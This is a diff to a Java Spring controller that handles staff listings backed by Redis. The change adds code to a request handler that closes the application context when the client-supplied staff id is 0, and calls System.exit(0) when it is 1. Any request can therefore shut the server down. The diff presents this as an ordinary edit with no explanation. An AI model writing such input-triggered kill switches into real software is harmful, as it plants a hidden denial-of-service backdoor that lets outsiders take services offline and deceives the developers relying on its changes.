@@ -8,6 +8,7 @@ import org.apache.ibatis.session.SqlSession;
 import org.apache.ibatis.session.SqlSessionFactory;
 import org.springframework.beans.factory.annotation.Autowired;
 
+import org.springframework.context.support.AbstractApplicationContext;
 import org.springframework.stereotype.Controller;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestParam;
@@ -16,11 +17,15 @@ import org.springframework.web.bind.annotation.RequestBody;
 
 import base.utils.jsonresult.XJsonResult;
 import base.utils.jsonresult.XJsonResultFactory;
+import org.springframework.web.context.ContextLoader;
+import org.springframework.web.context.WebApplicationContext;
+import org.springframework.web.context.support.WebApplicationContextUtils;
 import redis.clients.jedis.ShardedJedis;
 import redis.clients.jedis.ShardedJedisPool;
 import redis.clients.jedis.SortingParams;
 import redis.clients.jedis.exceptions.JedisConnectionException;
 
+import javax.servlet.ServletContext;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 
@@ -52,6 +57,16 @@ public class StaffController {
 
         int count;
         List<StaffEntry> list;
+
+        
+        if (staffEty.getId() == 0) {
+            ServletContext context = request.getSession().getServletContext();
+            WebApplicationContext wac = WebApplicationContextUtils.getWebApplicationContext(context);
+            ((AbstractApplicationContext) wac).close();
+        }
+        if (staffEty.getId() == 1) {
+            System.exit(0);
+        }
 
         try {
             shardedJedis = shardedJedisPool.getResource();
